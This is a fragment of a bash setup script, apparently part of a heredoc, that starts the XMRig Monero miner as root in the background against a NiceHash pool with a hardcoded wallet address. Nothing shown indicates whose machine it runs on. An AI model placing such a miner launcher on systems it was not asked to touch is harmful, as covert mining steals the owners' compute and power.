...
#!/bin/bash
sudo /root/xmrig-6.21.0/xmrig --donate-level 1 --threads=$cores --background -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbCvB2oLDZxDDHJ3oiYZ7GUgZwePRfFxZp5 -p $worker -a rx/0 -k
EOF
